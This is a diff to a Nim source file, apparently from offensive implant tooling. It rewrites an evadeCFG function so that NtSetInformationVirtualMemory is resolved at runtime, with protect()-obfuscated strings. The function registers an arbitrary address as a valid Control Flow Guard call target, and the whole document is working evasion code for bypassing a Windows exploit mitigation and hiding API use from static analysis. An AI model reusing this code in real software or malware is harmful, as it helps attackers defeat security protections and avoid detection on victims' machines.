@@ -25,13 +25,17 @@ type
         VmCfgCalltargetInformation
         VmPageDirtyStateInformation
 
-# https://ntdoc.m417z.com/ntsetinformationvirtualmemory
-proc NtSetInformationVirtualMemory(hProcess: HANDLE, VmInformationClass: VIRTUAL_MEMORY_INFORMATION_CLASS, NumberOfEntries: ULONG_PTR, virtualAddresses: ptr MEMORY_RANGE_ENTRY, vmInformation: PVOID, VmInformationLength: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtSetInformationVirtualMemory"), dynlib: protect("ntdll.dll").}
+type NtSetInformationVirtualMemory = proc(hProcess: HANDLE, VmInformationClass: VIRTUAL_MEMORY_INFORMATION_CLASS, NumberOfEntries: ULONG_PTR, virtualAddresses: ptr MEMORY_RANGE_ENTRY, vmInformation: PVOID, VmInformationLength: ULONG): NTSTATUS {.stdcall.}
 
 # Value taken from: https://www.codemachine.com/downloads/win10.1803/winnt.h
 var CFG_CALL_TARGET_VALID = 0x00000001
 
 proc evadeCFG*(address: PVOID): BOOL =
+    # Resolve NtSetInformationVirtualMemory (> Windows 7)
+    let pNtSetInformationVirtualMemory = cast[NtSetInformationVirtualMemory](GetProcAddress(GetModuleHandleA(protect("ntdll.dll")), protect("NtSetInformationVirtualMemory")))
+    if pNtSetInformationVirtualMemory == nil:
+        return false
+
     var dwOutput: ULONG
     var status: NTSTATUS
     var mbi: MEMORY_BASIC_INFORMATION
@@ -42,7 +46,7 @@ proc evadeCFG*(address: PVOID): BOOL =
 
     # Get start of region in which function resides 
     size = VirtualQuery(address, addr(mbi), sizeof(mbi))
-    
+
     if size == 0x0:
         return false
 
@@ -65,16 +69,16 @@ proc evadeCFG*(address: PVOID): BOOL =
     vmInformation.pMoarZero = nil
 
     # Register `address` as a valid call target for CFG
-    status = NtSetInformationVirtualMemory(
-        GetCurrentProcess(), 
-        VmCfgCalltargetInformation, 
-        cast[ULONG_PTR](1), 
-        addr(virtualAddresses), 
-        cast[PVOID](addr(vmInformation)), 
+    status = pNtSetInformationVirtualMemory(
+        GetCurrentProcess(),
+        VmCfgCalltargetInformation,
+        cast[ULONG_PTR](1),
+        addr(virtualAddresses),
+        cast[PVOID](addr(vmInformation)),
         cast[ULONG](sizeof(vmInformation))
     )
 
     if status != STATUS_SUCCESS:
-        return false 
+        return false
 
     return true
